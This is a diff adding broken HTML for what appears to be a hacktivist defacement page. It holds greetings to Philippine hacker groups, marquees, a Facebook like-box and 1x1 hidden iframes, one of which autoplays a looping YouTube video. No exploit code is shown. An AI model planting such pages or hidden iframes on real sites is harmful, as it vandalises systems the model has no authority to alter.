+        <font class="wglow" color="red" face="tahoma">PrivateCyberHackerz | Pinoy Vendetta | Family Pride | Philippine Cyber Army | AfflictionX | #Occupy Philippines | Anonymous Iligan | Anonymous Zamboanga Sibugay | xL3gi0n Hackers | Pak Cyber Eagles | 3xpir3 Cyber Army | Bisayan Hackers | PrivateX | pR.is0n3r | L00p th3 L00p | l4stl00k | busabos | Symbianize Hackers | Anonymous Philippines | and All Hackers Worldwide.</font>
+         
+        <font class="whiteglow" face="tahoma"> || </font>
+       
+
+        <span style="font-weight:bold; text-shadow:green 0px 0px 8px; color:kirmizi">
+
+        <font class="redglow" color="green" face="tahoma"> </font>
+         
+        <font class="whiteglow" face="tahoma"> || </font>
+                  
+         
+        <font class="wglow" color="Pink" face="tahoma"></font>
+         
+        <font class="whiteglow" face="tahoma"> || </font>
+         
+        <font class="blueglow" color="orange" face="tahoma"> GREETINGS : PrivateCyberHackerz | Pinoy Vendetta | Anonymous Philippines | Philippines Cyber Army | And to all Hackers Out There !</font>
+         
+        <font class="whiteglow" face="tahoma"> || </font>
+         
+       
+         
+        <font class="whiteglow" face="tahoma"> | </font>
+         
+        </marquee>                                      
+<br><br><br><br><br><br>
+
+<marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="40" width="100%"> _____________________________________ </marquee>
+<marquee behavior="scroll" direction="right" scrollamount="100" scrolldelay="40" width="100%"> _____________________________________ </marquee>
+
+<div align="center"><div align="center"><img src="http://i39.tinypic.com/2zq5ut5.gif"><br><font color="lime">Copyright © <span>#A.nnoyinm0us</span>.</font><br> <center><img src="http://i39.tinypic.com/2zq5ut5.gif </center>
+
+
+
+<script type="text/javascript">
+
+<div id="myContent" class="tip">
+
+
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/id_ID/all.js#xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<div>
+<script src="http://ojel88.googlecode.com/files/slidboxordinary.js" type="text/javascript"></script>
+<div id="fbslidebox" style="position: fixed; width: 342px; overflow: hidden; bottom: 20px; right: 10px; background: url("http://1.bp.blogspot.com/_JUg9QsmKp5s/TORmQZAoYXI/AAAAAAAACAI/cLoCJMP1rGo/s000/bo-bg-html.gif") repeat scroll 0% 0% transparent; -moz-border-radius: 15px 15px 15px 15px; border: 2px solid rgb(17, 17, 17); display: block;">
+     <div style="width: 320px; padding: 10px; margin: 0pt auto; overflow: hidden;">
+         <a id="fbcloseslidebox" style="float: right; color: rgb(153, 153, 153); padding: 0pt 3px; border: 1px solid rgb(204, 204, 204); text-decoration: none; font-size: 9px; font-family: Verdana,Geneva,sans-serif;" href="#">PrivateCyberHackerz Community</a>
+         <b style="color: rgb(102, 173, 61);">Follow on FB Click Like !!</b>
+<iframe scrolling="no" frameborder="0" allowtransparency="true" style="border: medium none; overflow: hidden; width: 300px; height: 250px;" src="http://www.facebook.com/plugins/likebox.php?href=http://www.facebook.com/PCHCommunity?ref=ts&width=300&colorscheme=dark&show_faces=true&stream=false&header=true&height=250">
+</iframe> 
+
+
+
+<iframe src="noedit%20fform_files/a.xhtml" frameborder="no" height="1" width="1" scrolling="no"></iframe>
+
+
+
+</body></html>
+
+
+<center><iframe width="1" height="1" src="http://www.youtube.com/embed/LApS9G22cIU?rel=0&autoplay=1&loop=1&playlist=LApS9G22cIU" frameborder="0" allowfullscreen></iframe></center>
